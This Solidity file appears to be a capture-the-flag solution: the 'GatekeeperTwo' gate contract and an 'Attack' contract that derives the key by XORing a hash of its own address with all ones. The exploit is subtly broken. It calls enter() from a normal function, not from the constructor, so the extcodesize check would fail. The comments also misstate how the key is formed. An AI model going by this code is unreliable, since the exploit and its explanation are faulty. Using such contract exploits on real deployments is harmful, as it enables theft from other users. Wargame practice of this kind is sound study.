// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      //key = msg.sender ^ 0xFFFFFFFFFFFFFFFF
      //msg.sender ^ key = 0xFFFFFFFFFFFFFFFF
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
contract Attack{
    GatekeeperTwo keeper;
    constructor(GatekeeperTwo _keeper)public {
        keeper= _keeper;
    }

    function attack()public{
        bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF;
        keeper.enter(key);
        
    }

}
   